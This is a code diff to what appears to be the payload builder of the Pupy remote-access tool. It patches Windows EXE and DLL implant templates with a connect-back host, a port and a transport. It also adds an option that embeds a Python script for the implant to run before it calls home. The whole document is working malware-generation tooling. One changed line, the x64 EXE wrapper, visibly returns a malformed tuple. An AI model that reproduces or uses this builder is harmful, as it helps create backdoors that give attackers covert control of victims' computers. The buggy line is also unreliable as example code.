@@ -10,19 +10,21 @@ import re
 from pupylib.utils.network import get_local_ip
 from network.conf import transports
 
-def get_edit_pupyx86_dll(host, ip, transport):
-	return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), host, ip, transport)
+def get_edit_pupyx86_dll(host, ip, transport, offline_script=None):
+	return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), host, ip, transport, offline_script)
 
-def get_edit_pupyx64_dll(host, ip, transport):
-	return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), host, ip, transport)
+def get_edit_pupyx64_dll(host, ip, transport, offline_script=None):
+	return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), host, ip, transport, offline_script)
 
-def get_edit_pupyx86_exe(host, ip, transport):
-	return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), host, ip, transport)
+def get_edit_pupyx86_exe(host, ip, transport, offline_script=None):
+	return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), host, ip, transport, offline_script)
 
-def get_edit_pupyx64_exe(host, ip, transport):
-	return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), host, ip, transport)
+def get_edit_pupyx64_exe(host, ip, transport, offline_script=None):
+	return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), host, ip, transport), offline_script
 
-def get_edit_binary(path, host, port, transport, offline_script=""):
+def get_edit_binary(path, host, port, transport, offline_script=None):
+	if not offline_script:
+		offline_script=""
 	binary=b""
 	with open(path, 'rb') as f:
 		binary=f.read()
@@ -41,7 +43,7 @@ def get_edit_binary(path, host, port, transport, offline_script=""):
 
 	new_conf="HOST=\"%s:%s\"\nTRANSPORT=%s\n%s\n\x00\x00\x00\x00\x00\x00\x00\x00"%(host, port, repr(transport), offline_script)
 	if len(new_conf)>4092:
-		raise Exception("Error: config too long")
+		raise Exception("Error: config or offline script too long")
 	binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
 	return binary
 
@@ -50,6 +52,7 @@ if __name__=="__main__":
 	parser = argparse.ArgumentParser(description='Process some integers.')
 	parser.add_argument('-t', '--type', default='exe_x86', choices=['exe_x86','exe_x64','dll_x86','dll_x64'], help="(default: exe_x86)")
 	parser.add_argument('-o', '--output', help="output path")
+	parser.add_argument('-s', '--offline-script', help="offline python script to execute before starting the connection")
 	parser.add_argument('-p', '--port', type=int, default=443, help="connect back ip (default:443)")
 	parser.add_argument('--transport', choices=[x for x in transports.iterkeys()], default='tcp_ssl', help="the transport to use ! (the server needs to be configured with the same transport) ")
 	parser.add_argument('host', nargs='*', help="connect back host")
@@ -66,30 +69,34 @@ if __name__=="__main__":
 			myhost, p=myhost.rsplit(':',1)
 			if args.port==443:
 				args.port=p
+	script_code=""
+	if args.offline_script:
+		with open(args.offline_script,'r') as f:
+			script_code=f.read()
 	outpath=None
 	if args.type=="exe_x86":
-		binary=get_edit_pupyx86_exe(myhost, args.port, args.transport)
+		binary=get_edit_pupyx86_exe(myhost, args.port, args.transport, script_code)
 		outpath="pupyx86.exe"
 		if args.output:
 			outpath=args.output
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="exe_x64":
-		binary=get_edit_pupyx64_exe(myhost, args.port, args.transport)
+		binary=get_edit_pupyx64_exe(myhost, args.port, args.transport, script_code)
 		outpath="pupyx64.exe"
 		if args.output:
 			outpath=args.output
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="dll_x64":
-		binary=get_edit_pupyx64_dll(myhost, args.port, args.transport)
+		binary=get_edit_pupyx64_dll(myhost, args.port, args.transport, script_code)
 		outpath="pupyx64.dll"
 		if args.output:
 			outpath=args.output
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="dll_x86":
-		binary=get_edit_pupyx86_dll(myhost, args.port, args.transport)
+		binary=get_edit_pupyx86_dll(myhost, args.port, args.transport, script_code)
 		outpath="pupyx86.dll"
 		if args.output:
 			outpath=args.output
@@ -97,7 +104,11 @@ if __name__=="__main__":
 			w.write(binary)
 	else:
 		exit("Type %s is invalid."%(args.type))
-	print "binary generated to %s with HOST=%s:%s and TRANSPORT=%s"%(outpath, myhost, args.port, args.transport)
+	print("binary generated with config :")
+	print("OUTPUT_PATH = %s"%os.path.abspath(outpath))
+	print("HOST = %s:%s"%(myhost, args.port))
+	print("TRANSPORT = %s"%args.transport)
+	print("OFFLINE_SCRIPT = %s"%args.offline_script)
 
 
 
